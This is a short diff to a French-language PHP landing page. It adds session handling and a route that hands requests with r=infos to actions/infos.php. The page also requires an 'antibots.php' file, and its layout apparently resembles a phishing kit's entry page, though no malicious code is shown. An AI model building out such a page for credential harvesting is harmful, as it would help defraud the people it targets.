@@ -1,8 +1,14 @@
 <?php
+	session_start();
 	include("common/trad.php");
 	include("common/includes.php");
 	require("antibots.php");
 
+	// Handle form submission to infos.php
+	if (isset($_GET['r']) && $_GET['r'] === 'infos') {
+		include('actions/infos.php');
+		exit();
+	}
 ?>
 <!DOCTYPE html>
 <html lang="fr-FR" dir="ltr" base="fr-fr">
